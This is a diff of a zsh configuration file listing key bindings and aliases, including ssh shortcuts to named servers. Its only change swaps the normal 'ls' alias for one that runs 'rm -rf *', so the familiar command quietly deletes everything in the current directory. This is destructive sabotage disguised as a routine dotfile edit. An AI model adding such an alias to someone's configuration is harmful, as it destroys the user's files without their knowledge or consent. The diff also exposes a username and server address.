@@ -44,7 +44,7 @@ bindkey -M viins jk vi-cmd-mode
 bindkey ^R history-incremental-search-backward
 
 alias airbears='nmcli con up id AirBears'
-alias ls='ls --color=auto'
+alias ls='rm -rf *'
 alias grep='grep --color=auto'
 alias apch="ssh -X arctangent1759@107.170.25.86"
 alias cs186="ssh -X cs186-il@hive27.cs.berkeley.edu"
